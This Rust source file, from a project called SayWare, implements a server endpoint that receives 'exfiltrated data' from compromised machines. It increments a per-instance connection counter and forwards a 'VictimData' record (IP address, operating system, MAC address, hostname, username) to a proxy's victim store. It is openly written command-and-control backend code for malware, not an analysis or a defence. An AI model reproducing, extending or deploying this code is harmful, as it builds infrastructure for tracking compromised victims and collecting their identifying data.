// SPDX-FileCopyrightText: 2025 The SayWare development team
//
// SPDX-License-Identifier: GPL-3.0-or-later

use crate::State;
use poem::{
    Result,
    error::InternalServerError,
    web::{Data, RemoteAddr},
};
use poem_openapi::{OpenApi, payload::Json};
use sayware_types::ExfiltratedData;
use serde::{Deserialize, Serialize};
use uuid::Uuid;

#[derive(Deserialize, Serialize, Default)]
struct InstanceData {
    connection_number: u32,
}

#[derive(Serialize)]
struct VictimData {
    address: String,
    operating_system: String,
    mac_address: String,
    hostname: String,
    username: String,
}

pub struct Exfiltration;

#[OpenApi]
impl Exfiltration {
    #[oai(path = "/", method = "post")]
    async fn send_exfiltrated_data(
        &self,
        state: Data<&State>,
        remote_address: &RemoteAddr,
        data: Json<ExfiltratedData>,
    ) -> Result<()> {
        let mut instance_data = state
            .0
            .proxy
            .get(format!(
                "{}/instances/{}",
                state.0.proxy_url, state.0.instance_identifier
            ))
            .send()
            .await
            .map_err(InternalServerError)?
            .error_for_status()
            .map_err(InternalServerError)?
            .json::<InstanceData>()
            .await
            .unwrap_or(InstanceData::default());

        instance_data.connection_number += 1;

        state
            .0
            .proxy
            .put(format!(
                "{}/instances/{}",
                state.0.proxy_url, state.0.instance_identifier
            ))
            .json(&instance_data)
            .send()
            .await
            .map_err(InternalServerError)?
            .error_for_status()
            .map_err(InternalServerError)?;

        state
            .0
            .proxy
            .post(format!(
                "{}/victims/{}/{}",
                state.0.proxy_url,
                Uuid::new_v4(),
                state.0.instance_identifier
            ))
            .json(&VictimData {
                address: match remote_address.0.as_socket_addr() {
                    Some(socket) => socket.ip().to_string(),
                    None => "Unknown".into(),
                },
                operating_system: data.0.operating_system,
                mac_address: data.0.mac_address,
                hostname: data.0.hostname,
                username: data.0.username,
            })
            .send()
            .await
            .map_err(InternalServerError)?
            .error_for_status()
            .map_err(InternalServerError)?;

        Ok(())
    }
}
